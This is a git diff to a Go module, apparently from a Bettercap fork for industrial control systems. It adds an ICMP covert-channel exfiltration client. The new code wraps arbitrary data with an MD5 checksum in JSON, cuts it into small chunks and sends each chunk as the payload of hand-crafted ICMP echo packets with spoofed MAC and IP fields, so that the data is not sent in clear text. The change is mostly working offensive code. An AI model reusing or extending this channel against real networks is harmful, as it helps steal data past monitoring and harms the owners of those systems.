@@ -1,9 +1,11 @@
-package icmp_echo8
+package client_icmp_echo8
 
 import (
+	"crypto/md5"
 	"crypto/rand"
 	"encoding/hex"
-
+	"encoding/json"
+	"fmt"
 	"log"
 	"net"
 	"time"
@@ -16,6 +18,11 @@ import (
 
 	"github.com/biero-el-corridor/Bettercap_ICS/session"
 )
+
+type exfil_data struct {
+	MD5  [16]byte `json:"MD5"`
+	DATA []byte   `json:"DATA"`
+}
 
 var (
 	//device       string session.I.Interface.Hostname
@@ -34,7 +41,46 @@ func randomHex(n int) (string, error) {
 	return hex.EncodeToString(bytes), nil
 }
 
-func exil_icmp_echo() {
+func shape_exfil_data(data []byte) {
+
+	var exfil = exfil_data{}
+	//fmt.Println("data1 string = ", data)
+	//fmt.Println("md51 string = ", md5.Sum(data))
+	md5 := md5.Sum(data)
+	exfil.DATA = data
+	exfil.MD5 = md5
+
+	//fmt.Println("data2 string = ", data)
+	//fmt.Println("md52 string = ", md5)
+	interm, err := json.Marshal(exfil)
+	if err != nil {
+		fmt.Println("")
+	}
+	// last encoding for not send in clear text
+	// no cyphering for now onlly hex value encoding
+	final, err := json.Marshal(interm)
+	if err != nil {
+		fmt.Println("")
+	}
+
+	// need to segment the packet into 32 bit chunk
+
+	nb_packet := (len(final) / 32) + 1
+
+	end_block := 0
+	for nb_packet != 0 {
+		if nb_packet == 1 {
+			exil_icmp_echo(final[end_block:])
+		} else {
+			end_block += 31
+			exil_icmp_echo(final[(end_block - 31):end_block])
+		}
+		nb_packet = nb_packet - 1
+	}
+
+}
+
+func exil_icmp_echo(exfil_array []byte) {
 
 	//session.I.Interface.Hostname
 	device := session.I.Interface.Hostname
@@ -45,6 +91,7 @@ func exil_icmp_echo() {
 	}
 	defer handle.Close()
 
+	// add a functions to modify mac address
 	ethernetLayer := &layers.Ethernet{ // https://pkg.go.dev/github.com/google/gopacket@v1.1.19/layers#Ethernet.EthernetType
 		SrcMAC:       net.HardwareAddr{0x4C, 0xE7, 0x05, 0x10, 0x22, 0xA3},
 		DstMAC:       net.HardwareAddr{0x4C, 0xE7, 0x05, 0x10, 0x22, 0xA3},
@@ -61,10 +108,11 @@ func exil_icmp_echo() {
 		Protocol: layers.IPProtocolICMPv4,
 		TTL:      64,
 		Checksum: 0,
-		SrcIP:    net.IP{10, 0, 2, 15},
-		DstIP:    net.IP{8, 8, 8, 8},
+		SrcIP:    net.IP{169, 254, 0, 6},
+		DstIP:    net.IP{169, 254, 0, 5},
 	}
 
+	// add a element to mofify the ID sections
 	//note the icmp packet is not the same on windows and linux
 	// the linux ICMP have a timestamp the windows does not
 	icmpLayer := &layers.ICMPv4{
@@ -92,11 +140,12 @@ func exil_icmp_echo() {
 		ethernetLayer,
 		ipLayer,
 		icmpLayer,
-		gopacket.Payload([]byte{1, 2, 3, 4, 5, 6, 2, 3, 4, 5, 6, 1, 2, 3, 4, 5, 6, 2, 3, 4, 5, 6}),
+		gopacket.Payload(exfil_array),
 	)
 	///////////////////
 	/// packet sending
 	///////////////////
+	//fmt.Println("data string value : ", exfil_array)
 
 	err = handle.WritePacketData(buffer.Bytes())
 	if err != nil {
